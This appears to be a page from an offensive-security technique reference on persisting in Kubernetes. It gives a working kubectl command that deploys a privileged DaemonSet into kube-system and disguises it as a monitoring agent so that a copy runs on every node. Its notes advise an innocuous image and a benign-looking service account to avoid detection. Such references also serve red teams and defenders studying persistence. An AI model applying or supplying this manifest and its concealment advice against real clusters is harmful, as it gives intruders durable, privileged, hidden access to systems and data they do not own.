---
title: "Malicious workloads: self-healing attacker deployments"
description: "Persisting in Kubernetes by running attacker code as a managed workload, a deployment, daemonset, or replicaset, so the controller recreates the pod if it is killed and, with a daemonset, places a foothold on every node including new ones."
keywords:
  - malicious deployment
  - daemonset
  - self-healing
  - kubernetes persistence
  - controller
---

# Malicious workloads

Running a bare pod is fragile; wrapping attacker code in a controller makes it durable. A deployment recreates a killed pod, and a daemonset guarantees a copy on every node, including nodes added later. Disguised with ordinary names and images, these blend into cluster noise.

```bash
# A daemonset puts a pod on every node and self-heals
kubectl apply -f - <<'YAML'
apiVersion: apps/v1
kind: DaemonSet
metadata: { name: node-exporter-agent, namespace: kube-system }
spec:
  selector: { matchLabels: { app: node-exporter-agent } }
  template:
    metadata: { labels: { app: node-exporter-agent } }
    spec:
      containers: [{ name: a, image: <attacker-image>, securityContext: { privileged: true } }]
YAML
```

## Exploitation notes

- A privileged daemonset in `kube-system` named like a monitoring agent is durable, cluster-wide, and easy to overlook.
- Controllers restore the pod after eviction or node drain, surviving routine operations.
- Pair with an innocuous image and a benign-looking service account to reduce suspicion.

## References

- [Kubernetes: daemonset](https://kubernetes.io/docs/concepts/workloads/controllers/daemonset/)
- [Kubernetes: deployments](https://kubernetes.io/docs/concepts/workloads/controllers/deployment/)
